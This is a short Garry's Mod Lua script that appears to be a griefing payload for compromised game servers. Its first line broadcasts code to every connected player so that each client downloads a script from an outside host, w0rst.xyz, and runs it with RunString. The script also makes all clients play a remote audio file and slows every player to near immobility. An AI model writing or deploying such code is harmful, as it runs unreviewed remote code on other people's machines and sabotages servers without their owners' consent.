BroadcastLua("http.Fetch('https://w0rst.xyz/script/extra/require/goatpopup', RunString)")
BroadcastLua("sound.PlayURL('https://w0rst.xyz/script/extra/require/bruh.mp3', 'mono', function(station) station:Play() end)")

for k,v in pairs(player.GetAll()) do
    v:SetMaxSpeed(0.5); 
    v:SetRunSpeed(0.5)
end